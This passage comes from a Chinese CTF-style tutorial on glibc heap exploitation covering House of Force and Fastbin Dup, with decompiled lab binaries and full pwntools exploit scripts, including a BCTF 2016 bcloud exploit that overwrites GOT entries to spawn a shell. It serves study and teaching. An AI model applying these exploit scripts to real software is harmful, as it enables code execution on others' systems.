                    // 如果不匹配
                    if ((&amp;fastbin (av, idx)) != fb)
                        malloc_printerr(&quot;malloc_consolidate(): invalid chunk size&quot;);
                }
                // 啥也没干
                check_inuse_chunk(av, p);
                // 拿到下一个元素
                nextp = p-&gt;fd;

                /* Slightly streamlined version of consolidation code in free() */
                // 拿到size
                size = chunksize (p);
                // 拿到下一个 chunk （物理意义）
                nextchunk = chunk_at_offset(p, size);
                // 拿到下一个 chunk （物理意义）的 size
                nextsize = chunksize(nextchunk);
                // 如果前一个 chunk 为释放状态
                if (!prev_inuse(p)) {
                    prevsize = prev_size (p);
                    size += prevsize;
                    p = chunk_at_offset(p, -((long) prevsize));
                    unlink(av, p, bck, fwd);
                }
                // 如果下一个 不是 top_chunk
                if (nextchunk != av-&gt;top) {
                    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

                    if (!nextinuse) {
                        size += nextsize;
                        unlink(av, nextchunk, bck, fwd);
                    } else
                        clear_inuse_bit_at_offset(nextchunk, 0);
                    // 拿到 unsorted_bin 的第一个元素
                    first_unsorted = unsorted_bin-&gt;fd;
                    // 进行链接
                    unsorted_bin-&gt;fd = p;
                    first_unsorted-&gt;bk = p;

                    if (!in_smallbin_range (size)) {
                        p-&gt;fd_nextsize = NULL;
                        p-&gt;bk_nextsize = NULL;
                    }

                    set_head(p, size | PREV_INUSE);
                    p-&gt;bk = unsorted_bin;
                    p-&gt;fd = first_unsorted;
                    set_foot(p, size);
                }
                // 下一个 chunk 是 top_chunk
                else {
                    size += nextsize;
                    set_head(p, size | PREV_INUSE);
                    av-&gt;top = p;
                }

            } while ((p = nextp) != 0);

        }
    // 遍历
    } while (fb++ != maxfb);
}
</code></pre>
<h3 id="Flowchart"><a href="#Flowchart" class="headerlink" title="Flowchart"></a>Flowchart</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p><img src="Heap.assets/image-20221018211322536.png" alt="image-20221018211322536"></p>
<h4 id="sysmalloc-1"><a href="#sysmalloc-1" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><p><img src="Heap.assets/image-20221018211539984.png" alt="image-20221018211539984"></p>
<h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p><img src="Heap.assets/image-20221018211632490.png" alt="image-20221018211632490"></p>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="Heap.assets/image-20221018211608180.png" alt="image-20221018211608180"></p>
<h2 id="Basic-Vulnerable"><a href="#Basic-Vulnerable" class="headerlink" title="Basic Vulnerable"></a>Basic Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数据之间的差距 。以这种方式进行的分配可以环绕VA空间，使得这种技术可以以比堆更低的地址为目标地址。</p>
<h4 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h4><p>在GLIBC版本&lt;2.29中，top chunk 大小字段在分配期间不受任何完整性检查。如果一个top chunk大小 的字段被覆盖，例如溢出并被替换成一个大的值，那么从该top chunk的后续分配可能会与使用中的内存重叠。在GLIBC&lt;2.30的版本中，从一个被破坏的top chunk中分配的非常大的内存可以环绕VA空间。</p>
<p>例如，一个top chunk 从地址0x405000开始，驻留在程序数据部分的地址0x404000的目标数据必须被覆盖。使用溢出覆盖顶top chunk 大小字段，将其替换为0xffffffffffffff1的值。接下来，计算将top chunk 移动到目标之前的地址所需的字节数。总数是0xffffffffffffffffff-0x405000字节，以达到VA空间的末端，然后是0x404000-0x20个字节，以在目标地址之前停止。<br>在这个请求top chunk得到服务后，下一个申请的块将与目标数据重叠。</p>
<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul>
<li><p>GLIBC 2.29版引入了顶部块大小字段的合理性检查。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p>
<p><img src="Heap.assets/image-20220814132821567.png" alt="image-20220814132821567"></p>
</li>
<li><p>GLIBC 2.30版引入了最大分配大小检查，它限制了 house of force”可以弥补的差距大小。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p>
<p><img src="Heap.assets/image-20220814133216729.png" alt="image-20220814133216729"></p>
</li>
</ul>
<h4 id="示例一：house-of-force"><a href="#示例一：house-of-force" class="headerlink" title="示例一：house_of_force"></a>示例一：house_of_force</h4><blockquote>
<p>文件详见附件 <a href="attachment/house_of_force/house_of_force">house_of_force</a></p>
</blockquote>
<h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ul>
<li>修改target的值</li>
<li>获取shell</li>
</ul>
<h5 id="检查安全措施"><a href="#检查安全措施" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/house_of_force]
└─$ checksec house_of_force                                 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.28_no-tcache&#39;
</code></pre>
<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序在运行时已给出libc地址及heap地址。</p>
<p>在<code>read(0, m_array[index++], v5 + 8);</code>中明显的溢出8个字节。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned __int64 v4; // rax
  size_t v5; // rax
  unsigned int index; // [rsp+14h] [rbp-3Ch]
  char *m; // [rsp+18h] [rbp-38h]
  char *m_array[4]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  House of Force&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  m = (char *)malloc(0x88uLL);
  printf(&quot;heap @ %p\n&quot;, m - 16);
  free(m);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 4LL);
      puts(&quot;2) target&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;\ntarget: %s\n&quot;, target);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 3 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        v4 = read_num();
        m_array[index] = (char *)malloc(v4);
        if ( m_array[index] )
        {
          printf(&quot;data: &quot;);
          v5 = malloc_usable_size(m_array[index]);
          read(0, m_array[index++], v5 + 8);
        }
        else
        {
          puts(&quot;request failed&quot;);
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
<li>由于堆上输入的时候恰有8个字节的溢出，修改top_chunk，从而达到任意地址写。</li>
<li>修改__malloc_hook 为system的地址。</li>
</ul>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>使用8字节溢出修改top_chunk的size为0xffffffffffffffff</p>
<pre><code class="python">malloc(24, b&quot;Y&quot;*24 + p64(0xffffffffffffffff)) 
</code></pre>
<p><img src="Heap.assets/image-20220816100317563.png" alt="image-20220816100317563"></p>
</li>
<li><p>计算与目标地址的地址</p>
<pre><code class="python"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             
def delta(x, y):
    return (0xffffffffffffffff - x) + y 
distance = delta(heap + 0x20, elf.sym.target - 0x20)
# heap -&gt; heap addr 0x20 -&gt;first chunk size
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
</code></pre>
</li>
<li><p>创建chunk，达到任意地址写</p>
<ul>
<li><p>modify_target</p>
<pre><code>~~~python
malloc(distance, b&quot;a&quot;)
malloc(24, b&#39;aaaaaaa&#39;)
</code></pre>
<p>  ~~~</p>
<p>  <img src="Heap.assets/image-20220816100752788.png" alt="image-20220816100752788"></p>
</li>
<li><p>drop shell</p>
<pre><code class="python">malloc(distance, b&quot;/bin/sh&quot;)
malloc(24, p64(libc.sym.system))
cmd = heap + 0x30
malloc(cmd, b&#39;&#39;)
</code></pre>
<p><img src="Heap.assets/image-20220816101120303.png" alt="image-20220816101120303"></p>
</li>
</ul>
</li>
</ul>
<h4 id="示例二：BCTF-2016-bcloud"><a href="#示例二：BCTF-2016-bcloud" class="headerlink" title="示例二：BCTF 2016  bcloud"></a>示例二：BCTF 2016  bcloud</h4><blockquote>
<p>文件详见附件 <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p>
</blockquote>
<h5 id="检查安全措施-1"><a href="#检查安全措施-1" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><p><img src="Heap.assets/image-20220814164430494.png" alt="image-20220814164430494"></p>
<h5 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h5><ul>
<li><p>将程序打完注释后为<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p>
</li>
<li><p>在<code>my_input</code>函数中在末尾 a2 的位置加入一个<code>\x00</code>, 而在name_init中s本为64的大小，<code>my_input</code>也是64，但会在65的位置加一个<code>\x00</code>, 但是由于后面的v2赋值的操作，将<code>\x00</code>覆盖为了别的值，而且会在后面的<code>some_output</code>泄露出v2的堆地址。由于字符串的结束标志为<code>\x00</code>，所以<code>strcpy </code>和 <code>puts</code> 函数都会对这个v2的堆地址进行操作。</p>
<pre><code class="c">int __cdecl my_input(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt; a2; ++i )
  {
    if ( read(0, &amp;buf, 1u) &lt;= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;
  return i;
}
unsigned int name_init()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts(&quot;Input your name:&quot;);
  my_input((int)s, 64, &#39;\n&#39;);
  v2 = (char *)malloc(0x40u);
  name_chunk_0x40 = (int)v2;
  strcpy(v2, s);
  some_output(v2);                              // 信息泄露
  return __readgsdword(0x14u) ^ v3;
}
int __cdecl some_output(const char *a1)
{
  printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;, a1);
  return puts(&quot;Now let&#39;s set synchronization options.&quot;);
}
</code></pre>
</li>
<li><p>在后面的<code>org_host_init</code>函数中对于org及host的初始化也像上述一样，我们注意到<code>strcpy</code>在给org赋值的时候会将org字符串、org返回地址以及host字符串全部赋给org，从而造成堆溢出构造我们使用<code>house of force</code>的条件。</p>
<pre><code class="c">unsigned int org_host_init()
{
  char org_chunk_con[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *org_chunk; // [esp+5Ch] [ebp-5Ch]
  char host_chunk_con[68]; // [esp+60h] [ebp-58h] BYREF
  char *host_chunk; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(org_chunk_con, 0, 0x90u);
  puts(&quot;Org:&quot;);
  my_input((int)org_chunk_con, 64, 10);
  puts(&quot;Host:&quot;);
  my_input((int)host_chunk_con, 64, 10);
  host_chunk = (char *)malloc(0x40u);
  org_chunk = (char *)malloc(0x40u);
  org_chunk_addr = (int)org_chunk;
  host_chunk_addr = (int)host_chunk;
  strcpy(host_chunk, host_chunk_con);
  strcpy(org_chunk, org_chunk_con);    // &lt;---
  puts(&quot;OKay! Enjoy:)&quot;);
  return __readgsdword(0x14u) ^ v5;
}
</code></pre>
</li>
<li><p>在后续的<code>new_note</code>、<code>show_note</code> 、<code>edit_note</code>、 <code>del_note</code>便为常规操作，值得注意的是程序最多创建10个node，将其地址和大小分别储存在<code>node_list</code>和<code>node_size_list</code>中，从而方便我们使用<code>edit_note</code>的时候修改某些值。</p>
</li>
</ul>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
<li>泄漏 heap 地址</li>
<li>利用溢出修改 top chunk 的 size</li>
<li>分配一个 chunk，将 top chunk 转移到 node_size_list 数组前面</li>
<li>再次分配 chunk，即可覆盖 node_list ，并利用 Edit 修改其内容</li>
<li>修改 <code>free@got.plt</code> 为 <code>puts@got.plt</code>，泄漏 libc</li>
<li>修改 <code>atoi@got.plt</code> 为 <code>system@got.plt</code>，得到 shell</li>
</ul>
<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>使用name的输入 -》 泄露堆地址</p>
<pre><code class="python"># leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814182744179.png" alt="image-20220814182744179"></p>
</li>
<li><p>利用org和host的输入 -》 修改top chunk的size为-1</p>
<pre><code class="python"># overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814194641198.png" alt="image-20220814194641198"></p>
</li>
<li><p>计算hack_chunk 的大小 将top_chunk移动至bss段</p>
<p>0x804b0a0 -&gt; note_size_list</p>
<pre><code class="python">new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
</code></pre>
</li>
<li><p>新建一个chunk 覆盖note_list 数组，并修改其内容</p>
<pre><code class="python">payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814212052885.png" alt="image-20220814212052885"></p>
</li>
<li><p>修改free_got 为 puts_got 泄露libc地址</p>
<pre><code class="python"># free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814212638115.png" alt="image-20220814212638115"></p>
</li>
<li><p>修改 atoi_got 为 system_got， 获得shell</p>
<pre><code class="python">system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))
io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)
io.interactive()
</code></pre>
<p><img src="Heap.assets/image-20220814214814810.png" alt="image-20220814214814810"></p>
</li>
</ul>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3

from pwn import *
elf = context.binary = ELF(&#39;./bcloud&#39;)
libc = elf.libc
context.log_level = &#39;debug&#39;
gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
def new(length, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;1&#39;)
    io.sendlineafter(&quot;note content:\n&quot;, str(length))
    io.sendlineafter(&quot;content:\n&quot;, context)
def edit(idx, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;3&#39;)
    io.sendline(str(idx))
    io.sendlineafter(&quot;content:\n&quot;, context)
def dele(idx):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;4&#39;)
    io.sendlineafter(&quot;id:\n&quot;, str(idx))
def dbg():
    gdb.attach(io)
    pause()
# leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)

# overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()

new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
# new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#39;aaaa&#39;)
# dbg()
# new(0x40, b&quot;a&quot;*0x40)
payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
# free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)

system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))

io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)

io.interactive()
</code></pre>
<h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>利用double-free错误，强制malloc返回一个chunk两次，中间不释放它。这种技术通常是通过破坏fastbin元数据，将一个假的块链接到fastbin中来利用的。这个假块可以被分配，然后程序功能可以被用来读取或写入一个任意的内存位置。</p>
<h4 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h4><p>fastbin中double free检查只确保被释放到fastbin中的块不是该bin中的第一个块(链表头部的块、刚刚释放的块)，如果在两个bin之间释放了一个相同大小的不同块，则检查通过。</p>
<ul>
<li><p>正常情况:</p>
<p><img src="Heap.assets/image-20220820160146712.png" alt="image-20220820160146712"></p>
</li>
<li><p>double free:</p>
<p><img src="Heap.assets/image-20220820161049541.png" alt="image-20220820161049541"></p>
<pre><code class="c">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
        mchunkptr old = *fb, old2;
        unsigned int old_idx = ~0u;
        do {
            /* Check that the top of the bin is not the record we are going to add
               (i.e., double free).  */
            if (__builtin_expect(old == p, 0)) {
                errstr = &quot;double free or corruption (fasttop)&quot;;
                goto errout;
            }
            /* Check that size of fastbin chunk at the top is the same as
               size of the chunk that we are adding.  We can dereference OLD
               only if we have the lock, otherwise it might have already been
               deallocated.  See use of OLD_IDX below for the actual check.  */
            if (have_lock &amp;&amp; old != NULL)
                old_idx = fastbin_index(chunksize(old));
            p-&gt;fd = old2 = old;
        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);

        if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0)) {
            errstr = &quot;invalid fastbin entry (free)&quot;;
            goto errout;
        }
</code></pre>
</li>
<li><p>绕过 double free:</p>
<p><img src="Heap.assets/image-20220820162024274.png" alt="image-20220820162024274"></p>
</li>
</ul>
<p>除此之外，在释放时还会检查当前块的size域与头部域是否相等，由于我们释放的是同一个块，也就不存在该问题。</p>
<h4 id="如何利用fastbin-dup"><a href="#如何利用fastbin-dup" class="headerlink" title="如何利用fastbin dup"></a>如何利用fastbin dup</h4><p>将一个块二次释放后，我们继续malloc一个相同大小的块，此时malloc将从fastbin中创建块，而不是在top chunk中创建。此时我们往这个块中填写数据就意味着我们正在修改这个块的fd指针，将其修改为一个我们想要的值即可。</p>
<p><img src="Heap.assets/image-20220820164643151.png" alt="image-20220820164643151"></p>
<p>但是此过程中也存在着一个对size域的检查措施，因此我们常常使用__malloc_hook前35字节所出现的一个0x7f的大小字段，然后将__malloc_hook修改为one_gadget。所需要注意的是假尺寸字段中不兼容的标志，一个设置的NON_MAIN_ARENA标志和一个清除的 CHUNK_IS_MMAPPED标志会导致一个segfault。能够这样做的原因是，分配既不受对齐检查，也不受标志损坏检查</p>
<p><img src="Heap.assets/image-20220820181022737.png" alt="image-20220820181022737"></p>
<pre><code class="c">    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) {
        idx = fastbin_index (nb);
        mfastbinptr *fb = &amp;fastbin (av, idx);
        mchunkptr pp = *fb;
        do {
            victim = pp;
            if (victim == NULL)
                break;
        } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))
                 != victim);
        if (victim != 0) {
            if (__builtin_expect(fastbin_index (chunksize(victim)) != idx, 0)) {
                errstr = &quot;malloc(): memory corruption (fast)&quot;;
                errout:
                malloc_printerr(check_action, errstr, chunk2mem (victim), av);
                return NULL;
            }
            check_remalloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }
</code></pre>
<h4 id="示例一：fastbin-dup"><a href="#示例一：fastbin-dup" class="headerlink" title="示例一：fastbin_dup"></a>示例一：fastbin_dup</h4><blockquote>
<p>文件详见附件 <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p>
</blockquote>
<h5 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h5><ul>
<li>修改target的值</li>
<li>获取shell</li>
</ul>
<h5 id="检查安全措施-2"><a href="#检查安全措施-2" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/fastbin_dup]
└─$ checksec fastbin_dup   
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h5><p>在程序运行时给出了libc的地址，并未阻止double free的操作。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-4Ch]
  size_t n; // [rsp+18h] [rbp-48h]
  unsigned __int64 na; // [rsp+18h] [rbp-48h]
  char *m_array[7]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+58h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  printf(&quot;\nEnter your username: &quot;);
  read(0, &amp;user_0, 0x10uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 7LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) target&quot;);
      puts(&quot;4) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num &gt; 2 )
    {
      if ( num == 3 )
      {
        printf(&quot;\ntarget: %s\n&quot;, user_0.target);
      }
      else if ( num == 4 )
      {
        exit(0);
      }
    }
    else if ( num == 1 )
    {
      if ( index &gt; 6 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x78 )
        {
          puts(&quot;fast chunks only (120 bytes maximum)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
}
pwndbg&gt; ptype user
type = struct user {
    char username[16];
    char target[16];
}
00000000 user struc ; (sizeof=0x20, copyof_13)   ; XREF: .data:user_0/r
00000000 username db 16 dup(?)
00000010 target db 16 dup(?)
00000020 user ends
00000020
</code></pre>
<h5 id="思路分析-》modify"><a href="#思路分析-》modify" class="headerlink" title="思路分析-》modify"></a>思路分析-》modify</h5><ul>
<li>观察到target在user结构体的中的target，且该结构体的大小为0x20，使用开始的username的输入构造一个虚假的size字段。</li>
<li>进行fastbin dup，将fd改为user结构体的位置。</li>
<li>修改target</li>
</ul>
<h5 id="漏洞利用-》modify"><a href="#漏洞利用-》modify" class="headerlink" title="漏洞利用-》modify"></a>漏洞利用-》modify</h5><ul>
<li><p>fastbin dup </p>
<pre><code class="python"># Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)
</code></pre>
<p><img src="Heap.assets/image-20220820173211603.png" alt="image-20220820173211603"></p>
</li>
<li><p>修改fd指针</p>
<pre><code class="python"># modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))
</code></pre>
<p><img src="Heap.assets/image-20220820173412011.png" alt="image-20220820173412011"></p>
</li>
<li><p>malloc twice</p>
<pre><code class="python"># malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220820174021017.png" alt="image-20220820174021017"></p>
</li>
<li><p>malloc fake chunk</p>
<pre><code class="python"># malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
</code></pre>
<p>但此时由于我们之前并没有设置虚假的size字段，所以会出现一个中断。如果我们设置了那个虚假的字段，便修改完成</p>
<p><img src="Heap.assets/image-20220820174213853.png" alt="image-20220820174213853"></p>
</li>
<li><p>success</p>
<p><img src="Heap.assets/image-20220820175408919.png" alt="image-20220820175408919"></p>
</li>
</ul>
<h5 id="exp-》modify"><a href="#exp-》modify" class="headerlink" title="exp-》modify"></a>exp-》modify</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# Set the username field.
username = p64(0) + p64(0x31)
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b&quot;A&quot;*0x28)
chunk_B = malloc(0x28, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))

# malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)

# malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
# =============================================================================

io.interactive()
</code></pre>
<h5 id="思路分析-》drop-shell"><a href="#思路分析-》drop-shell" class="headerlink" title="思路分析-》drop shell"></a>思路分析-》drop shell</h5><ul>
<li>fastbin dup</li>
<li>__malloc_hook -&gt; one_gadget</li>
</ul>
<h5 id="漏洞利用-》drop-shell"><a href="#漏洞利用-》drop-shell" class="headerlink" title="漏洞利用-》drop shell"></a>漏洞利用-》drop shell</h5><ul>
<li><p>虚假字段的大小为0x7f -&gt; 意味着我们要申请0x68的chunk。然后fastbin dup 将其fd修改至__malloc_hook - 35 的位置。</p>
